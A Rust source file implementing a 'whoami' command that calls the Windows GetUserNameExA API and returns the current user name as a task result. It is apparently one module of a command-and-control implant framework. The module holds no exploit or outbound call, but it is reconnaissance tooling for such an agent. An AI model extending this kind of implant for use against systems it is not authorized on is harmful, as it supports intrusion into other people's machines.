use std::ptr::null_mut;
use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::{CloseHandle, FALSE, GetLastError, HANDLE};
use windows::Win32::Security::Authentication::Identity::{GetUserNameExA, NameSamCompatible};
use crate::functions::lockHelper::with_lock;
use crate::models::{rustyTask::rustyTask};
use crate::models::rustyTaskResponseType::rustyTaskResponseType;
use crate::models::rustyTaskStatus::rustyTaskStatus;
use crate::models::taskReturnTypes::messageData::stringMessage;
use crate::models::taskReturnTypes::OutputType;
use crate::tasking::processing::taskProcessor;
use super::command_base;

pub struct Whoami
{
    pub name: String,
}

impl Whoami
{
    pub fn new() -> Self
    {
        return Self
        {
            name: "whoami".to_string(),
        }
    }
}

impl command_base for Whoami
{
    fn execute(&self, task: rustyTask,task_processor: &taskProcessor)
    {
        println!("Executing whoami command");
        // implementation for whomai
        // call once to get size
        let mut size: u32 = 0;
        let mut dummy_buffer: [u8; 1] = [0];
        let result = unsafe { GetUserNameExA(NameSamCompatible, PSTR(dummy_buffer.as_mut_ptr()), &mut size) };

        // if size is still 0, something went wrong
        if size == 0 {
            println!("GetUserNameExA failed: {:?}", unsafe { GetLastError() });
            return;
        }

        // create buffer of size
        let mut buffer = vec![0u8; size as usize];
        let success = unsafe { GetUserNameExA(NameSamCompatible, PSTR(buffer.as_mut_ptr()), &mut size) };

        // hopefully this doesn't happen
        if !success.as_bool()
        {
            println!("GetUserNameExA failed: {:?}", unsafe { GetLastError() });
            return;
        }

        // Convert buffer to string
        match String::from_utf8(buffer)
        {
            Ok(str) => task_processor.fill_result(OutputType::StringMessage(stringMessage::new(str.trim_end_matches('\0').to_string())), task, rustyTaskStatus::Complete, rustyTaskResponseType::String),
            //Ok(str) => println!("Username: {}", str.trim_end_matches('\0')),
            Err(e) => println!("[x] {}", e),
        }
    }
}